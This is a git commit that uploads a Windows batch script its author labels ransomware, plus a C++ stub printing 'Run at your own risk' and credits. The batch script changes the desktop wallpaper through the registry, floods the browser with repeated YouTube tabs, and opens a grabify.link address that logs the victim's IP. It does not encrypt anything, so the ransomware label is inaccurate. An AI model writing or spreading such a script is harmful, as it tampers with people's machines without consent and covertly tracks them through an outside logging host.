7ba97153daf49bf9316b7327a49552e0f4178a47
wxzzgs <154992220+wxzzgs@users.noreply.github.com>
2025-06-28 18:28:58 -0500

    Add files via upload

---
+++ Methampton.exe (Ransomeware)/Methampton.exe (Main).bat
@@ -0,0 +1,14 @@
+@echo off
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /f /t REG_SZ /d c:\images\
+start https://www.youtube.com/watch?v=77K0fcQ4eDA
+start https://grabify.link/FFW9E9
+start https://www.youtube.com/watch?v=77K0fcQ4eDA
+start https://www.youtube.com/watch?v=77K0fcQ4eDA
+start https://www.youtube.com/watch?v=77K0fcQ4eDA
+start https://www.youtube.com/watch?v=77K0fcQ4eDA
+start https://www.youtube.com/watch?v=77K0fcQ4eDA
+start https://www.youtube.com/watch?v=77K0fcQ4eDA
+start https://www.youtube.com/watch?v=77K0fcQ4eDA
+start https://www.youtube.com/watch?v=77K0fcQ4eDA
+print c:\Button UI.txt /c /d:lpt1
+start https://static.wikia.nocookie.net/exeafd/images/5/58/Screenshot_2025-06-27_215122.png/revision/latest?cb=20250628030746
---
+++ Methampton.exe (Ransomeware)/Run at your own risk + credits.cpp
@@ -0,0 +1,7 @@
+#include <iostream>
+using namespace std;
+
+int main() {
+	cout << "Run at your own risk!" << endl;
+	cout << "made by OceanEmpireRblx or notoceandisasters on discord!." << endl;
+}
